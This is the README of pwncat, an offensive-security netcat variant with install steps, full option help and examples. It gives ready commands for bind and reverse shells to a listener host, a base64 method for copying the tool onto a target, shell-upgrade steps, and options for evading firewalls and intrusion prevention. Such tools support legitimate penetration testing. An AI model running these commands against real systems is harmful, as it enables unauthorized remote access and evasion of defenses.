# pwncat

**[Install](#tada-install)** |
**[TL;DR](#coffee-tldr)** |
**[Features](#star-features)** |
**[Documentation](#closed_book-documentation)** |
**[Usage](#computer-usage)** |
**[Examples](#bulb-examples)** |
**[cytopia sec tools](#lock-cytopia-sec-tools)** |
**[Contributing](#octocat-contributing)** |
**[Disclaimer](#exclamation-disclaimer)** |
**[License](#page_facing_up-license)**

[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PyPI](https://img.shields.io/pypi/v/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Status](https://img.shields.io/pypi/status/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Format](https://img.shields.io/pypi/format/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Implementation](https://img.shields.io/pypi/implementation/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - License](https://img.shields.io/pypi/l/pwncat)](https://pypi.org/project/pwncat/)

[![Build Status](https://github.com/cytopia/pwncat/workflows/linting/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=linting)
[![Build Status](https://github.com/cytopia/pwncat/workflows/building/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=building)
[![Build Status](https://github.com/cytopia/pwncat/workflows/Linux/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=Linux)
[![Build Status](https://github.com/cytopia/pwncat/workflows/MacOS/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=MacOS)
[![Build Status](https://github.com/cytopia/pwncat/workflows/Windows/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=Windows)


> &nbsp;
> #### Netcat on steroids with Firewall and IPS evasion, bind and reverse shell, and local port forwarding.
> &nbsp;

| :warning: Warning: it is currently in feature-incomplete alpha state. Expect bugs and options to change. ([Roadmap](https://github.com/cytopia/pwncat/issues/2)) |
|---|


### Motivation

Ever accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?
Ever waited forever for your client to connect back to you, because the Firewall didn't let it out?
Ever had a connection loss because an IPS closed suspicious ports?
Ever were in need of a quick port forwarding?<br/>
> **This one got you covered.**

Apart from that the current features of `nc`, `ncat` or `socat` just didn't feed my needs and I also wanted to have a single
tool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.
(Wait for it, binary releases for Linux, MacOS and Windows will come shortly).


## :tada: Install
```bash
pip install pwncat
```


## :coffee: TL;DR

#### Copy to target
```bash
# Copy base64 data to clipboard from where you have internet access
curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64

# Paste it on the target machine
echo "<BASE64 STRING>" | base64 -d > pwncat
chmod +x pwncat
```
#### Summon shells
```bash
# bind shell
pwncat -l -e '/bin/bash' 8080
```
```bash
# reverse shell
pwncat -e '/bin/bash' example.com 4444
```
#### Port forwarding

See here to un-brainfuck: https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/<br/>
(Using the same examples to make it more clear)

The only difference to SSH port-forwarding shown in the blog, is that in their case, the MySQL server is only available on localhost on the remote server.
SSH portfowarding is exactly for this case, as it SSH's into the machine and can reach their local port.
In the example here, we cannot SSH into the server, so we can only forward/proxy something which is externally available.
That's why we just assume the MySQL server is listening publically on everythingcli.org (i.e, their port 3306 is externally available.)
```bash
# Local port forward (-L)
# Make Remote MySQL server (remote port 3306) available on local machine on local port 5000
# (listen locally on 127.0.0.1:5000 and proxy everything to everythingcli.org:3306)
pwncat -L 127.0.0.1:5000 everythingcli.org 3306
```


## :star: Features

`pwncat` has many features, below is only a list of outstanding characteristics.

| Feature        | Description |
|----------------|-------------|
| Bind shell     | Create bind shells |
| Reverse shell  | Create reverse shells |
| Port Forward   | Local port forward (Proxy server) |
| <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |
| Detect Egress  | Scan and report open egress ports on the target |
| Evade FW       | Evade egress firewalls by round-robin outgoing ports |
| Evade IPS      | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts |
| UDP rev shell  | Try this with the traditional `netcat` |
| TCP / UDP      | Full TCP and UDP support |
| Python 2+3     | Works with Python 2 and Python 3 |
| Cross OS       | Should work on Linux, MacOS and Windows as long as Python is available |
| Compatability  | Use the traditional `netcat` as a client or server together with `pwncat` |


## :dizzy: Upgrade your shell

> This is a general advice and not only works with `pwncat`, but with all common tools.

When connected with a reverse or bind shell you'll notice that no interactive commands will work and
hitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.
To fix this, you'll need to attach it to a TTY. Here's how:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
<kbd>Ctrl</kbd>+<kbd>z</kbd>
```bash
stty size
stty echo -raw
fg
reset
export SHELL=bash
export TERM=xterm
stty rows <num> columns <num>   # values found above by 'stty size'
```


## :closed_book: Documentation

Documentation will evolve over time.

* API docs can be found here: [pwncat.api.html](https://cytopia.github.io/pwncat/pwncat.api.html)
* HTML man page can be found here: [pwncat.man.html](https://cytopia.github.io/pwncat/pwncat.man.html)
* Raw man page can be found here: [pwncat.1](man/pwncat.1)


## :computer: Usage
```
usage: pwncat [-Cnuv] [-e cmd] hostname port
       pwncat [-Cnuv] [-e cmd] -l [hostname] port
       pwncat [-Cnuv] -z hostname port
       pwncat [-Cnuv] -L addr:port [hostname] port
       pwncat -V, --version
       pwncat -h, --help


Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion detection/prevention systems.

If no mode arguments are specified, pwncat will run in connect mode and act as
a client to connect to a remote endpoint. If the connection to the remote
endoint is lost, pwncat will quit. See advanced options for how to automatically
reconnect.

positional arguments:
  hostname              Address to listen, forward or connect to
  port                  Port to listen, forward or connect to

mode arguments:
  -l, --listen          [Listen mode]:
                        Start a server and listen for incoming connections.
                        If using TCP and a connected client disconnects or the
                        connection is interrupted otherwise, the server will
                        quit. See -k/--keep-open to change this behaviour.

  -z, --zero            [Zero-I/0 mode]:
                        Connect to a remote endpoint and report status only.
                        Used for port scanning.

  -L addr:port, --local addr:port
                        [Local forward mode]:
                        This mode will start a server and a client internally.
                        The internal server will listen locally on specified
                        hostname/port (positional arguments). Same as with -l.
                        The server will then forward traffic to the internal
                        client which connects to another server specified by
                        address given via -L/--local addr:port.
                        (I.e.: proxies a remote service to a local address)

optional arguments:
  -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
  -C, --crlf            Replace LF with CRLF from stdin (default: don't)
  -n, --nodns           Do not resolve DNS.
  -u, --udp             Use UDP for the connection instead of TCP.
  -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv
                        or -vvvv for more verbosity. The server performance will
                        decrease drastically if you use more than three times.

advanced arguments:
  --http                Connect / Listen / Local forward mode (TCP only):
                        Hide traffic in http packets to fool Firewalls/IDS/IPS.

  --https               Connect / Listen / Local forward mode (TCP only):
                        Hide traffic in https packets to fool Firewalls/IDS/IPS.

  -k, --keep-open       Listen mode (TCP only):
                        Re-accept new clients in listen mode after a client has
                        disconnected or the connection is unterrupted otherwise.
                        (default: server will quit after connection is gone)

  --rebind x            Listen mode (TCP and UDP):
                        If the server is unable to bind or accept clients, it
                        will re-initialize itself x many times before giving up.
                        Use 0 to re-initialize endlessly. (default: fail after
                        first unsuccessful try).

  --rebind-wait s       Listen mode (TCP and UDP):
                        Wait x seconds between re-initialization. (default: 1)

  --rebind-robin port   Listen mode (TCP and UDP):
                        If the server is unable to initialize (e.g: cannot bind
                        and --rebind is specified, it it will shuffle ports in
                        round-robin mode to bind to. Use comma separated string
                        such as '80,81,82' or a range of ports '80-100'.
                        Set --rebind to at least the number of ports to probe +1
                        This option requires --rebind to be specified.

  --reconn x            Connect mode / Zero-I/O mode (TCP only):
                        If the remote server is not reachable or the connection
                        is interrupted, the client will connect again x many
                        times before giving up. Use 0 to retry endlessly.
                        (default: quit if the remote is not available or the
                        connection was interrupted)
                        This might be handy for stable TCP reverse shells ;-)

  --reconn-wait s       Connect mode / Zero-I/O mode (TCP only):
                        Wait x seconds between re-connects. (default: 1)

  --reconn-robin port   Connect mode / Zero-I/O mode (TCP only):
                        If the remote server is not reachable or the connection
                        is interrupted and --reconn is specified, the client
                        will shuffle ports in round-robin mode to connect to.
                        Use comma separated string such as '80,81,82' or a range
                        of ports '80-100'.
                        Set --reconn to at least the number of ports to probe +1
                        This helps reverse shell to evade intrusiona prevention
                        systems that will cut your connection and block the
                        outbound port.
                        This is also useful in Connect or Zero-I/O mode to
                        figure out what outbound ports are allowed.

  -w s, --wait s        Connect mode (TCP only):
                        If a connection and stdin are idle for more than s sec,
                        then the connection is silently closed and the client
                        will exit. (default: wait forever).
                        Note: if --reconn is specified, the connection will be
                        re-opened.

  --udp-ping-init       Connect mode / Zero-I/O mode (UDP only):
                        UDP is a stateless protocol unlike TCP, so no hand-
                        shake communication takes place and the client just
                        sends data to a server without being "accepted" by
                        the server first.
                        This means a server waiting for an UDP client to
                        connect to, is unable to send any data to the client,
                        before the client hasn't send data first. The server
                        simply doesn't know the IP address before an initial
                        connect.
                        The --udp-ping-init option instructs the client to send
                        one single initial ping packet to the server, so that it
                        is able to talk to the client.
                        This is the only way to make a UDP reverse shell work.
                        See --udp-ping-word for what char/string to send as
                        initial ping packet (default: '\0')

  --udp-ping-intvl s    Connect mode / Zero-I/O mode (UDP only):
                        Instruct the UDP client to send ping intervalls every
                        s seconds. This allows you to restart your UDP server
                        and just wait for the client to report back in.
                        This might be handy for stable UDP reverse shells ;-)
                        See --udp-ping-word for what char/string to send as
                        initial ping packet (default: '\0')

  --udp-ping-word str   Connect mode / Zero-I/O mode (UDP only):
                        Change the default character '\0' to use for upd ping.
                        Single character or strings are supported.

  --udp-ping-robin port
                        Zero-I/O mode (UDP only):
                        Instruct the UDP client to shuffle the specified ports
                        in round-robin mode for a remote server to ping.
                        This might be handy to scan outbound allowed ports.
                        Use --udp-ping-intvl 0 to be faster.

  --safe-word str       All modes:
                        If pwncat is started with this argument, it will shut
                        down as soon as it receives the specified string. The
                        --keep-open (server) or --reconn (client) options will
                        be ignored and it won't listen again or reconnect to you.
                        Use a very unique string to not have it shut down
                        accidentally by other input.

misc arguments:
  -h, --help            Show this help message and exit
  -V, --version         Show version information and exit
```


## :bulb: Examples

Find below some more detailed and advanced examples.


### Unbreakable UDP reverse shell
Why unbreakable? Because it will keep coming to you, even if you kill your listening server temporarily.
```bash
# The client
# --exec            # Provide this executable
# --nodns           # Keep the noise down and don't resolve hostnames
# --udp             # Use UDP mode
# --udp-ping-intvl  # Ping the server every 10 seconds

pwncat --exec /bin/bash --nodns --udp --udp-ping-intvl 10 10.0.0.1 4444
```
If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on
```bash
# The server
# -u   # Use UDP mode
# -l   # Listen for incoming connections
pwncat -u -l -vvvvv
```
You will see (among all the gibberish) a TRACE message:
```
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:43213'
```
As soon as you saw this on the listener, you can issue commands to the client.
All the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate
your server and start it again in silent mode:
```bash
# The server
pwncat -u -l -vvvvv
```
Now wait a maximum of 10 seconds and you can issue commands.
Having no info messages at all, is also troublesome. You might want to know what is going
on behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect
the notifications to a logfile:
```bash
# The server
# 2> comm.txt   # This redirects the messages to a logfile instead
pwncat -u -l -vvv 2> comm.txt
```
Now all you'll see in your server window are the actual command inputs and outputs.
If you want to see what's going on behind the scene, open a second terminal window and tail
the `comm.txt` file:
```
# View communication info
tail -fn50 comm.txt

[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
```


## :lock: [cytopia](https://github.com/cytopia) sec tools

Below is a list of sec tools and docs I am maintaining.

| Name                 | Category             | Language   | Description |
|----------------------|----------------------|------------|-------------|
| **[offsec]**         | Documentation        | Markdown   | Offsec checklist, tools and examples |
| **[header-fuzz]**    | Enumeration          | Bash       | Fuzz HTTP headers |
| **[smtp-user-enum]** | Enumeration          | Python 2+3 | SMTP users enumerator |
| **[urlbuster]**      | Enumeration          | Python 2+3 | Mutable web directory fuzzer |
| **[pwncat]**         | Pivoting             | Python 2+3 | Cross-platform netcat on steroids |
| **[badchars]**       | Reverse Engineering  | Python 2+3 | Badchar generator |
| **[fuzza]**          | Reverse Engineering  | Python 2+3 | TCP fuzzing tool |

[offsec]: https://github.com/cytopia/offsec
[header-fuzz]: https://github.com/cytopia/header-fuzz
[smtp-user-enum]: https://github.com/cytopia/smtp-user-enum
[urlbuster]: https://github.com/cytopia/urlbuster
[pwncat]: https://github.com/cytopia/pwncat
[badchars]: https://github.com/cytopia/badchars
[fuzza]: https://github.com/cytopia/fuzza


## :octocat: Contributing

See **[Contributing guidelines](CONTRIBUTING.md)** to help to improve this project.


## :exclamation: Disclaimer

This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.


## :page_facing_up: License

**[MIT License](LICENSE.txt)**

Copyright (c) 2020 **[cytopia](https://github.com/cytopia)**
